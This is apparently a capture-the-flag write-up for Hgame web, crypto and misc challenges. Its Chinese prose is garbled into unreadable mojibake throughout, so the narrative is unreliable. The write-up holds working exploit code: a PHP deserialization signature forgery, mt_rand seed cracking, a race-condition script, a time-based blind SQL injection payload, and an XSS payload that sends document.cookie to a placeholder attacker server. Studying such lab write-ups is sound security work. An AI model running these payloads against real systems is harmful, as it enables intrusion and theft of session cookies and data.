ã€å‚è€ƒèµ„æ–™1ã€‘ï¼šhttp://virtualdub2.com/ã€å‚è€ƒèµ„æ–™2ã€‘ï¼šhttps://sourceforge.net/projects/virtualdubffmpeginputplugin/ ç»“åˆé¢˜â½¬ç»™å‡ºçš„å‚è€ƒèµ„æ–™ï¼Œå¯ä»¥å‘ç°å¯¹è§†é¢‘è¿›â¾å¤„ç†éœ€è¦â½¤åˆ°VirtualDub2ã€‚ç»“åˆç™¾åº¦æœç´¢ï¼ŒçŒœæƒ³è§†é¢‘ç»è¿‡MSU StegoVideoéšå†™ï¼ŒMSU StegoVideoé“¾æ¥ï¼šhttp://www.compression.ru/video/stego_video/index_en.html å®‰è£…è½¯ä»¶ï¼Œå¹¶å°†æ’ä»¶å…¨éƒ¨è§£å‹â¾„plugin32â½‚ä»¶å¤¹ã€‚éšåè¿â¾32ä½ç‰ˆæœ¬VirtualDub2ï¼Œè½½â¼Šæ’ä»¶ã€‚Video -&gt; Filters -&gt; Add -&gt; MSU StegoVideo 1.0 -&gt; OKï¼š å¼¹å‡ºMSU StegoVideoæ’ä»¶ç•Œâ¾¯ã€‚é€‰æ‹© Extract fifile from videoï¼Œå¹¶å¡«å¥½å¯†ç å’Œåˆ†ç¦»å‡ºçš„â½‚ä»¶çš„è·¯å¾„ ç„¶åæ‰“å¼€è§†é¢‘æ–‡ä»¶ï¼Œæ¥ç€Go-&gt; Preview fifiltered æ’­æ”¾ä¸€ä¼šå‘ç°ï¼Œæ–‡ä»¶é‡Œå†™å…¥äº† è§£å‹å¾—åˆ°Code128.pngï¼Œåœ¨çº¿è§£å¯†åœ°å€ï¼šhttps://online-barcode-reader.inliteresearch.com cryptoVerification_codeæœ‰æºç ï¼Œå°±æ˜¯ä¸€ä¸ªæš´åŠ›ç ´è§£ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python3# -*- coding: utf-8 -*-import socketserverimport os, sys, signalimport string, randomfrom hashlib import sha256from secret import FLAGclass Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b&#x27;&#x27; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b&#x27;\\n&#x27; self.request.sendall(msg) except: pass def recv(self, prompt=b&#x27;&gt; &#x27;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): random.seed( os.urandom(8) ) proof = &#x27;&#x27;.join([ random.choice(string.ascii_letters+string.digits) for _ in range(20) ]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(str.encode( &quot;sha256(XXXX+%s) == %s&quot; % (proof[4:],_hexdigest) )) x = self.recv(prompt=b&#x27;Give me XXXX: &#x27;) if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def handle(self): signal.alarm(60) if not self.proof_of_work(): return self.send(b&#x27;The secret code?&#x27;) _code = self.recv() if _code == b&#x27;I like playing Hgame&#x27;: self.send(b&#x27;Ok, you find me.&#x27;) self.send(b&#x27;Here is the flag: &#x27; + FLAG) self.send(b&#x27;Bye~&#x27;) else: self.send(b&#x27;Rua!!!&#x27;) self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;, 1234 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() å†™äº†ä¸ªexpï¼Œå¾ˆçƒ‚2333â€¦.. 12345678910111213141516171819202122232425from hashlib import sha256import stringimport socket,res=string.ascii_letters+string.digitssk=socket.socket()sk.connect((&quot;47.98.192.231&quot;,25678))secret=sk.recv(1024).decode()print(secret)ant=re.match(r&quot;sha256\\(XXXX\\+(\\w&#123;16&#125;)\\) == (\\w&#123;64&#125;)&quot;,secret).group(1)txt=re.match(r&quot;sha256\\(XXXX\\+(\\w&#123;16&#125;)\\) == (\\w&#123;64&#125;)&quot;,secret).group(2)for i in s: for j in s: for k in s: for l in s: flag=i+j+k+l if txt==sha256((flag+ant).encode()).hexdigest(): print(flag) print(sk.recv(1024).decode()) sk.send(flag.encode()) print(sk.recv(1024).decode()) sk.send(b&quot;I like playing Hgame&quot;) while sk.recv(1024): print(sk.recv(1024).decode()) exit() Week3webåºåˆ—ä¹‹äº‰ - Ordinal Scalesource.zipæœ‰æºç ï¼Œåœ¨game.phpä¸­å¯ä»¥çœ‹åˆ°ï¼š 123&lt;?php if($game-&gt;rank-&gt;Get() === 1)&#123;?&gt; &lt;h2&gt;hgame&#123;flag_is_here&#125;&lt;/h2&gt;&lt;?php &#125;?&gt; å³å½“æˆ‘ä»¬æˆä¸ºç¬¬â¼€åæ—¶ï¼Œå³å¯è·å¾— flagã€‚è·Ÿè¿›å»çœ‹â¼€ä¸‹Get()â½…æ³•ï¼š 12345678910111213public function __construct()&#123; if(!isset($_SESSION[&#x27;rank&#x27;]))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION[&#x27;rank&#x27;]);&#125;public function Set($no)&#123; $this-&gt;rank = $no; &#125;public function Get()&#123; return $this-&gt;rank; &#125; å¯ä»¥çœ‹åˆ°$rankæ˜¯ä»Sessionâ¾¥â¾¯å–å¾—çš„ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è®¾ç½® Session çš„åŠæ³•ã€‚ åœ¨Rankç±»çš„ææ„å‡½æ•°ä¸­å­˜åœ¨è®¾ç½® Sessionã€‚åŒæ—¶åœ¨ 108 â¾å­˜åœ¨unserializeååºåˆ—åŒ–å‡½æ•°ï¼ŒåŒæ—¶ç»“åˆ è¯¥é¢˜åå­—ä¸º åºåˆ—ä¹‹äº‰ å› æ­¤å°è¯•ä½¿â½¤ååºåˆ—åŒ–æ¥ä¿®æ”¹ Sessionã€‚ ç„¶â½½åœ¨ unserialize å‡½æ•°å‰æœ‰â¼€æ­¥æ£€æŸ¥ï¼š 123456$monsterData = base64_decode($_COOKIE[&#x27;monster&#x27;]);if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); $monsterData æ˜¯é€šè¿‡å¯¹ Cookie monster è¿›â¾å­—ç¬¦ä¸²æˆªå–å¾—åˆ°çš„ï¼Œ monster åæœ‰â¼€ä¸ª 32 ä½çš„ md5 $sign è¿›â¾ç­¾åæ£€æŸ¥ã€‚è¿™â¾¥æˆ‘ä»¬å°±éœ€è¦çŸ¥é“ encryptKey çš„å€¼æ‰èƒ½ä¼ªé€ è¿™ä¸ªç­¾åã€‚ â½½ encryptKey æ˜¯æ¥â¾ƒäº Game ç±»çš„ sign å±æ€§ï¼š 123456private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125;&#125; â¼Šå‚ $data çš„å€¼ä¸ºæ•°ç»„ [$playerName, $this-&gt;encryptKey] ï¼Œå…ƒç´ ä¸­å«æœ‰ encryptKey ã€‚ åˆ†æâ¼€ä¸‹è¿™ä¸ªâ½…æ³•çš„åŠŸèƒ½ï¼Œè¿™ä¸ª init() â½…æ³•æ˜¯â½¤æ¥åˆå§‹åŒ–æ¬¢è¿è¯­ welcomeMsg ä»¥åŠ sign ã€‚ å…¶ä¸­æ¬¢è¿è¯­ welcomeMsg çš„â½£æˆä¸­ä½¿â½¤äº† sprintf å‡½æ•°ï¼Œä¸”æ”¾åœ¨â¼€ä¸ªå¾ªç¯å†…ï¼Œç¬¬â¼†è½®å¾ªç¯çš„ $value å€¼ å³ä¸º encryptKey ã€‚å› æ­¤å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ è¿›â¼Šæ¸¸æˆï¼Œè¾“â¼Šåå­—ï¼š %s ï¼Œå³å¯ä½¿å¾—åœ¨ç¬¬â¼†è½®å¾ªç¯ä¸­ %s çš„å€¼è¢« sprintf å‡½æ•°æ¢æˆ encryptKey ã€‚ç‚¹ å‡» Link Startï¼Œæ‹¿åˆ° encryptKey ï¼š 1gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL ç„¶åå°±å¯ä»¥ä¼ªé€  $sign äº†ã€‚ ä½† Rank ç±»çš„ææ„å‡½æ•°ï¼š 1234567891011121314public function __destruct()&#123; // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼ $this-&gt;serverKey = $_SERVER[&#x27;key&#x27;]; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION[&#x27;rank&#x27;] = $this-&gt;rank; &#125;else&#123; // â¾®æ­£å¸¸è®¿é—® session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125;&#125; åœ¨è®¾ç½® Session å‰ä¼šâ½å¯¹ key ä»¥åŠ serverKey çš„å€¼ï¼Œå…¶ä¸­ serverKey æ˜¯æ¥â¾ƒäºæœåŠ¡å™¨çš„ç¯å¢ƒå˜é‡ï¼Œè¿™ ä¸ªå€¼æˆ‘ä»¬â½†æ³•è·å¾—ã€‚ è¿™â¾¥æœ‰ä¸¤ç§â½…æ³•ï¼šâ¼€ç§æ˜¯å¼•â½¤èµ‹å€¼ï¼Œå¯ä»¥å°† $this-&gt;serverKey çš„å¼•â½¤èµ‹å€¼ç»™ç»™ $this-&gt;key ã€‚ 1$this-&gt;key = &amp;$this-&gt;serverKey å¦â¼€ç§â½…æ³•æ˜¯ç›´æ¥ä¸è®¾ç½® $key å±æ€§ã€‚ååºåˆ—åŒ–æ—¶ä¼šå– Rank ç±»ä¸­çš„é»˜è®¤å€¼ã€‚ æ‹ä¸‹æ€è·¯ï¼š è¾“å…¥%sè·å¾—encryptKey æ„é€ æ‰§è¡Œååºåˆ—åŒ–å‡½æ•°ï¼Œååºåˆ—åŒ–Rankç±»ï¼Œå°†$rankè®¾ç½®æˆ1 ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œ__destruct()æ–¹æ³•å¯ä»¥å¼•â½¤èµ‹å€¼æˆ–è€…ä¸èµ‹å€¼ä¸¤ç§æ–¹å¼ æœ€ç»ˆ exp: 1234567891011121314151617&lt;?phpclass Rank&#123; private $rank = 1; private $serverKey; private $key; public function __construct()&#123; $this-&gt;key = &amp;$this-&gt;serverKey; &#125;&#125;$data = [&#x27;moonback&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;];$sign = &#x27;&#x27;;foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125;$rank = serialize(new Rank());echo(base64_encode($rank . md5($rank . $sign))); æˆ–è€… 123456789101112&lt;?phpclass Rank&#123; private $rank = 1; &#125;$data = [&#x27;moonback&#x27;, &#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;];$sign = &#x27;&#x27;;foreach($data as $value)&#123; $sign .= md5($sign . $value);&#125;$rank = serialize(new Rank());echo(base64_encode($rank . md5($rank . $sign))); è¾“â¼Šåå­— moonback è¿›â¼Šæ¸¸æˆï¼Œæ›¿æ¢ monster Cookieï¼Œåˆ·æ–°â»šâ¾¯ï¼Œæˆä¸ºç¬¬â¼€åæ‹¿åˆ° flag è´´ä¸€ä¸‹ä»£ç ï¼š cardinal.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?phperror_reporting(0);session_start();class Game&#123; private $encryptKey = &#x27;SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW&#x27;; public $welcomeMsg = &#x27;%s, Welcome to Ordinal Scale!&#x27;; private $sign = &#x27;&#x27;; public $rank; public function __construct($playerName)&#123; $_SESSION[&#x27;player&#x27;] = $playerName; if(!isset($_SESSION[&#x27;exp&#x27;]))&#123; $_SESSION[&#x27;exp&#x27;] = 0; &#125; $data = [$playerName, $this-&gt;encryptKey]; $this-&gt;init($data); $this-&gt;monster = new Monster($this-&gt;sign); $this-&gt;rank = new Rank(); &#125; private function init($data)&#123; foreach($data as $key =&gt; $value)&#123; $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value); $this-&gt;sign .= md5($this-&gt;sign . $value); &#125; &#125;&#125;class Rank&#123; private $rank; private $serverKey; private $key = &#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;; public function __construct()&#123; if(!isset($_SESSION[&#x27;rank&#x27;]))&#123; $this-&gt;Set(rand(2, 1000)); return; &#125; $this-&gt;Set($_SESSION[&#x27;rank&#x27;]); &#125; public function Set($no)&#123; $this-&gt;rank = $no; &#125; public function Get()&#123; return $this-&gt;rank; &#125; public function Fight($monster)&#123; if($monster[&#x27;no&#x27;] &gt;= $this-&gt;rank)&#123; $this-&gt;rank -= rand(5, 15); if($this-&gt;rank &lt;= 2)&#123; $this-&gt;rank = 2; &#125; $_SESSION[&#x27;exp&#x27;] += rand(20, 200); return array( &#x27;result&#x27; =&gt; true, &#x27;msg&#x27; =&gt; &#x27;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&#x27; ); &#125;else&#123; return array( &#x27;result&#x27; =&gt; false, &#x27;msg&#x27; =&gt; &#x27;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&#x27; ); &#125; &#125; public function __destruct()&#123; // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼ $this-&gt;serverKey = $_SERVER[&#x27;key&#x27;]; if($this-&gt;key === $this-&gt;serverKey)&#123; $_SESSION[&#x27;rank&#x27;] = $this-&gt;rank; &#125;else&#123; // éæ­£å¸¸è®¿é—® session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125; &#125;&#125;class Monster&#123; private $monsterData; private $encryptKey; public function __construct($key)&#123; $this-&gt;encryptKey = $key; if(!isset($_COOKIE[&#x27;monster&#x27;]))&#123; $this-&gt;Set(); return; &#125; $monsterData = base64_decode($_COOKIE[&#x27;monster&#x27;]); if(strlen($monsterData) &gt; 32)&#123; $sign = substr($monsterData, -32); $monsterData = substr($monsterData, 0, strlen($monsterData) - 32); if(md5($monsterData . $this-&gt;encryptKey) === $sign)&#123; $this-&gt;monsterData = unserialize($monsterData); &#125;else&#123; session_start(); session_destroy(); setcookie(&#x27;monster&#x27;, &#x27;&#x27;); header(&#x27;Location: index.php&#x27;); exit; &#125; &#125; $this-&gt;Set(); &#125; public function Set()&#123; $monsterName = [&#x27;æ— åå°æ€ª&#x27;, &#x27;BOSS: The Kernal Cosmos&#x27;, &#x27;å°æ€ª: Big Eggplant&#x27;, &#x27;BOSS: The Mole King&#x27;, &#x27;BOSS: Zero Zone Witch&#x27;]; $this-&gt;monsterData = array( &#x27;name&#x27; =&gt; $monsterName[array_rand($monsterName, 1)], &#x27;no&#x27; =&gt; rand(1, 2000), ); $this-&gt;Save(); &#125; public function Get()&#123; return $this-&gt;monsterData; &#125; private function Save()&#123; $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey); setcookie(&#x27;monster&#x27;, base64_encode(serialize($this-&gt;monsterData) . $sign)); &#125;&#125; äºŒå‘å…¥é­‚ï¼è¿™é‡Œæä¾›ä¸€ä¸ªæ–°æ€è·¯æ¥ç®—å‡ºç§å­ï¼šhttps://www.ambionics.io/blog/php-mt-rand-prediction å®‰å…¨å®¢ç¿»è¯‘æ–‡ç« ï¼šhttps://www.anquanke.com/post/id/196831 ç®€å•çš„è¯´ï¼Œå°±æ˜¯å¦‚æœçŸ¥é“æŸä¸ªéšæœºæ•°çš„å€¼ä»¥åŠè¿™ä¸ªéšæœºæ•°å‰éšæœºæ•°çš„ä¸ªæ•°ï¼Œå¹¶ä¸”çŸ¥é“ä¸ç›¸éš”226ä¸ªéšæœºæ•°çš„çš„å€¼ï¼Œå°±å¯ä»¥ç®—å‡ºseedï¼Œå½“ç„¶è¿™ä¸ªéšæœºæ•°å¯ä»¥æ˜¯ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼Œè¿™æ—¶å€™åªéœ€çŸ¥é“ç¬¬227ä¸ªéšæœºæ•°çš„å€¼å°±å¯ä»¥äº† exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219#!/usr/bin/env python3.7# Charles Fol# @cfreal_# 2020-01-04 (originally la long time ago ~ 2010)# Breaking mt_rand() with two output values and no bruteforce.#&quot;&quot;&quot;R = final rand valueS = merged state values = original state value&quot;&quot;&quot;import randomimport sysN = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed): &quot;&quot;&quot;Creates the initial state array from a seed. &quot;&quot;&quot; state = [None] * N state[0] = seed &amp; 0xffffffff; for i in range(1, N): r = state[i-1] state[i] = ( STATE_MULT * ( r ^ (r &gt;&gt; 30) ) + i ) &amp; MAX return statedef undo_php_mt_initialize(s, p): &quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed. &quot;&quot;&quot; # We have: # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000 # and: # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse) # =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000) for i in range(p, 0, -1): s = _undo_php_mt_initialize(s, i) return sdef _undo_php_mt_initialize(s, i): s = (STATE_MULT_INV * (s - i)) &amp; MAX return s ^ s &gt;&gt; 30def php_mt_rand(s1): &quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the user. &quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 ^= (s1 &gt;&gt; 18) return s1def undo_php_mt_rand(s1): &quot;&quot;&quot;Retrieves the merged state value from the value sent to the user. &quot;&quot;&quot; s1 ^= (s1 &gt;&gt; 18) s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680) s1 ^= s1 &gt;&gt; 11 s1 ^= s1 &gt;&gt; 22 return s1def undo_lshift_xor_mask(v, shift, mask): &quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask) &quot;&quot;&quot; for i in range(shift, 32, shift): v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i return vdef bits(v, start, size): return lobits(v &gt;&gt; start, size)def lobits(v, b): return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b): return v &amp; (1 &lt;&lt; b)def bv(v, b): return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour): s = state for i in range(0, N - M): s[i] = _twist_php(s[i+M], s[i], s[i+1], flavour) for i in range(N - M, N - 1): s[i] = _twist_php(s[i+M-N], s[i], s[i+1], flavour)def _twist_php(m, u, v, flavour): &quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines. &quot;&quot;&quot; mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0 return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour): #define twist_php(m,u,v) (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU)) # m S000 # u S227 # v S228 X = S000 ^ S227 # This means the mask was applied, and as such that S227&#x27;s LSB is 1 s22X_0 = bv(X, 31) # remove mask if present if s22X_0: X ^= 0x9908b0df # Another easy guess s227_31 = bv(X, 30) # remove bit if present if s227_31: X ^= 1 &lt;&lt; 30 # We&#x27;re missing bit 0 and bit 31 here, so we have to try every possibility s228_1_30 = (X &lt;&lt; 1) for s228_0 in range(2): for s228_31 in range(2): if flavour == MT_RAND_MT19937 and s22X_0 != s228_0: continue s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30 # Check if the results are consistent with the known bits of s227 s227 = _undo_php_mt_initialize(s228, 228 + offset) if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0: continue if bv(s227, 31) != s227_31: continue # Check if the guessed seed yields S000 as its first scrambled state rand = undo_php_mt_initialize(s228, 228 + offset) state = php_mt_initialize(rand) php_mt_reload(state, flavour) if not (S000 == state[offset]): continue return rand return Nonedef main(_R000, _R227, offset, flavour): # Both were &gt;&gt; 1, so the leftmost byte is unknown _R000 &lt;&lt;= 1 _R227 &lt;&lt;= 1 for R000_0 in range(2): for R227_0 in range(2): R000 = _R000 | R000_0 R227 = _R227 | R227_0 S000 = undo_php_mt_rand(R000) S227 = undo_php_mt_rand(R227) seed = undo_php_mt_reload(S000, S227, offset, flavour) if seed: return seeddef test_do_undo(do, undo): for i in range(10000): rand = random.randrange(1, MAX) done = do(rand) undone = undo(done) if not rand == undone: print(f&quot;-- &#123;i&#125; ----&quot;) print(bin(rand).rjust(34)) print(bin(undone).rjust(34)) breakdef test(): test_do_undo( php_mt_initialize, lambda s: undo_php_mt_initialize(s[227], 227) ) test_do_undo( php_mt_rand, undo_php_mt_rand ) exit()# test()import requestsimport jsonurl = &quot;https://twoshot.hgame.n3ko.co/&quot;req = requests.session()r = req.get(url+&quot;random.php?times=228&quot;)# print(r.content)data = json.loads(r.text)seed = main(data[0], data[len(data)-1], 0, 0)r = req.post(url+&quot;verify.php&quot;, data=&#123;&quot;ans&quot;:seed&#125;)print(r.text) expä¸­çš„mainå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŸä¸ªéšæœºæ•°çš„å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸è¿™ä¸ªéšæœºæ•°ç›¸éš”226ä¸ªéšæœºæ•°çš„éšæœºæ•°çš„å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¿™ä¸ªéšæœºæ•°å‰é¢éšæœºæ•°çš„ä¸ªæ•°ï¼Œç¬¬å››ä¸ªå‚æ•°æ˜¯phpçš„ç‰ˆæœ¬ï¼Œ0ä»£è¡¨php5ï¼Œ1ä»£è¡¨php7 Cosmosçš„äºŒæ‰‹å¸‚åœºé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ¡ä»¶ç«äº‰ï¼ŒçœŸæ²¡æƒ³åˆ°,expï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import threadingimport requestsimport jsonimport timedef worker(i,data): if i%2==0: url=&quot;&#123;&#125;?method=solve&quot;.format(host) else: url=&quot;&#123;&#125;?method=buy&quot;.format(host) try: s.post(url=url,data=data) except: print(&quot;è¯·æ±‚å¤±è´¥&quot;) returnhost=&quot;http://121.36.88.65:9999/API/&quot;user=&#123;&quot;name&quot;:&quot;roc&quot;,&quot;password&quot;:&quot;123456&quot;&#125;s=requests.session()s.post(url=&quot;&#123;&#125;?method=login&quot;.format(host),data=user)i=1while True: data=&#123; &quot;code&quot;:&#x27;800001&#x27;, &quot;amount&quot;:&#x27;500&#x27; &#125; info=json.loads(s.get(&quot;&#123;&#125;?method=getinfo&quot;.format(host)).text) money=info[&#x27;data&#x27;][&#x27;money&#x27;] properties=info[&#x27;data&#x27;][&#x27;properties&#x27;] print(money) print(properties) if money&gt;100000000: print(s.get(&quot;&#123;&#125;?method=getflag&quot;.format(host)).text) break if i%2==0: amount=int(properties[0][&#x27;amount&#x27;]) else: amount=money//10000 if amount&gt;500: amount=500 data[&#x27;amount&#x27;]=amount for j in range(30): t=threading.Thread(target=worker,args=(i,data)) t.start() time.sleep(5) i+=1 Cosmosçš„ç•™è¨€æ¿-2æŒ‰ç…§ç•™è¨€æ¿1ï¼ŒçŒœæµ‹è¿™é¢˜å°±æ˜¯sqlæ³¨å…¥ï¼Œæœ€ååœ¨åˆ é™¤çš„ä½ç½®å­˜åœ¨ç›²æ³¨ ç›´æ¥ç”¨sqlmapè·‘å‡ºæ¥äº†ğŸ˜‚ payload: 123method=delete&amp;delete_id=(CASE WHEN (5147=5147) THEN SLEEP(5) ELSE 5147 END)ä¸¾ä¸ªä¾‹å­ï¼š(CASE WHEN (ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM babysql.`user` ORDER BY id LIMIT 3,1),5,1))&gt;47) THEN SLEEP(4) ELSE 6131 END) Cosmosçš„èŠå¤©å®¤2.0è¿™é“é¢˜è¯•äº†å¥½ä¹…ï¼Œåæ¥æ‰å‘ç°æœ‰CSP 1Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; å®ƒé™åˆ¶äº†å†…è” JS è„šæœ¬ï¼Œå¹¶ä¸”é™åˆ¶äº†å¼•â¼Šçš„é™æ€èµ„æºâ½‚ä»¶åªèƒ½ä»åŒåŸŸä¸‹åŠ è½½ã€‚åœ¨å®é™…åº”â½¤ä¸­ï¼Œé‡åˆ°è¿™ç§CSPâ¼€èˆ¬æ˜¯æ‰¾è¯¥ç«™æ˜¯å¦æœ‰â½‚ä»¶ä¸Šä¼ ç‚¹ï¼Œä¹Ÿå¯ä»¥åŒæºä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ‰§â¾ä»»æ„ JS ä»£ç çš„ evil.js â½‚ä»¶ é¢˜ç›®çš„è¿‡æ»¤å¾ˆç®€å•ï¼ŒåŒå†™å°±å¯ä»¥ç»•è¿‡ï¼Œé¢˜ç›®æœ‰ä¸ªæ¥â¼/sendï¼Œå®ƒä¼šè¿”å›è¿‡æ»¤åçš„æ¶ˆæ¯å†…å®¹ï¼Œå¹¶ä¸”æ˜¯GETè¯·æ±‚æ–¹å¼ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ä¸‹é¢çš„payload: 1&lt;scriscriptpt src=&quot;/send?message=window.open(&#x27;http://yourvps/?&#x27;%2bdocument.cookie)&quot;&gt;&lt;/scscriptript&gt; æ³¨æ„+å·è¦urlç¼–ç ä¸º%2b miscç¾ äºº é²¸è¿™é¢˜æ˜¯ä¸ªdockeré•œåƒï¼Œå…ˆpullä¸‹æ¥ ç„¶åè¿è¡Œå¹¶è¿›å…¥å®¹å™¨ 1docker run -t -i 31ab18768617 /bin/sh æœç´¢ä¸€ä¸‹æ–‡ä»¶ 1find / -name flag* æ‰¾åˆ°/usr/share/man/man8/flag.tar.gzï¼Œå…ˆæ‹·è´å‡ºæ¥ 1docker cp ba61f2585d31:/usr/share/man/man8/flag.tar.gz /home/ubuntu/Desktop/ #å­—ç¬¦ä¸²ä¸ºå®¹å™¨id è§£å‹å‘ç°READMEé‡Œæœ‰See sh history.ï¼Œå†è¿›å…¥å®¹å™¨ å‘ç°å†/rootç›®å½•ä¸‹æœ‰.ash_historyæ–‡ä»¶ é‡Œé¢æœ‰echo -e &quot;Zip password is somewhere else in /etc.\\nFind it!&quot; æç¤ºæˆ‘ä»¬zipå¯†ç å†/etcä¸‹ 1grep -rn &quot;Zip&quot; /etc -ræ˜¯é€’å½’æ–¹å¼æŸ¥æ‰¾ç›®å½•ï¼Œ-næ˜¾ç¤ºè¡Œå· åœ¨issueæ–‡ä»¶æ‰¾åˆ°zipå¯†ç ï¼ŒZip Password: cfuzQ3Gd6gqKG@$N è§£å‹å¾—åˆ°flag.dbï¼Œç›´æ¥è®°äº‹æœ¬æˆ–è€…NavicatæŸ¥çœ‹å¾—åˆ°flag ä¸‰é‡éšå†™è§£å‹é™„ä»¶ï¼ŒYou know LSB.wavï¼ŒçŒœæµ‹wavçš„lsbéšå†™ï¼Œå¯ä»¥ç›´æ¥ç”¨å·¥å…·SilentEye ä¸‹è½½é“¾æ¥ï¼šhttps://silenteye.v1kings.io/download.html?i2 å¾—åˆ°ï¼šStegano key: uFSARLVNwVIewCY5 è¯•äº†è¯•ï¼Œå‘ç°ä¸Šè£ä¸æ‰‹æŠ„å·.mp3æ˜¯MP3Stegoéšå†™ï¼Œå¯†ç æ˜¯æˆ‘ä»¬ä¹‹é—´å¾—åˆ°çš„ å¾—åˆ°ï¼šZip Password: VvLvmGjpJ75GdJDP è§£å‹å‹ç¼©åŒ…å¾—åˆ°flag.cryptoï¼Œå®‰è£…é™„ä»¶ä¸­çš„å·¥å…·ï¼Œå‘ç°éœ€è¦å¯†ç  å¯¹äºUnlasting.mp3ï¼Œä½¿ç”¨foremoståˆ†ç¦»å‡ºä¸€å¼ pngå›¾ç‰‡ï¼Œbinwalkå¥½åƒåˆ†ç¦»ä¸å‡ºæ¥ æ˜¯Pdf417çš„äºŒç»´ç æ‰«ç ï¼Œåœ¨çº¿ç½‘å€ï¼šhttps://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/) 